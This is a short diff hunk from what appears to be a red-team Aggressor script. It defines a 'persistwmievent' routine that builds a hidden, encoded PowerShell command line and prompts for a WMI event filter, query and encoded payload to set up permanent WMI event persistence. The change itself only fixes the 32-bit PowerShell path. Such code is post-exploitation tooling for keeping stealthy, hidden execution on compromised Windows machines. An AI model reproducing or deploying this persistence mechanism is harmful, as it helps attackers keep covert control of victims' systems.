@@ -9,7 +9,7 @@ sub persistwmievent  {
 		$ExePath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -enc";
 	}
 	else {
-		$ExePath = "C:\\Windows\\powershell.exe -nop -w hidden -enc";
+		$ExePath = "C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -enc";
 	}
 
 	$dialog = dialog("Permanent WMI Event Persistence with PowerShell", %(eventfilter => "__EventFilter Name..", eventquery => "Event Query...(Win32 Classes)", payloadstring => "Encoded Payload String.."), lambda({
